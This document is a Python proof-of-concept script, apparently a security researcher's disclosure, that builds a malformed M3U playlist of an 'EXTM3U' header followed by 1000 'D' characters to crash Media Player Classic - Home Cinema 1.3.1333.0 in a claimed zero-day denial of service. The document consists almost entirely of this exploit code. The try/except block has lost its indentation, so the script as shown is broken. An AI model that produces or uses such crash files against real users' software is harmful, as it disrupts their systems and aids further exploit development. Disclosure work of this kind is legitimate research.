 
##########PoC Start################
print("\n*****Program need to be run on Python 3.1*****")
print ("""Media Player Classic - Home Cinema 1.3.1333.0 M3U File DoS
(0-Day)\r\n\r\nTested on:\nWindows XP SP3\n
Media Player Classic - Home Cinema\n\t\t Build number: 1.3.1333.0\n\t\t
MPC Compiler: VS 2008\n\t\t FFmpeg Compiler: GCC 4.4.1\n""")
 
head = "EXTM3U"
buf = "D" * 1000
 
mal_buf = head + buf
#print ("mal_buf:",mal_buf)
try:
mpc_mal = open("mpc_m3u_crash.m3u",'w')
mpc_mal.write (mal_buf)
mpc_mal.close()
print ("File Created Successfully: mpc_m3u_crash.m3u\n")
except:
print ("Cannnot Create M3U File\n")
 
print ("[+] Found and Coded by: Praveen Darshanam\r\n")
##########PoC End################
 
Best Regards,
Praveen Darshanam,
Security Researcher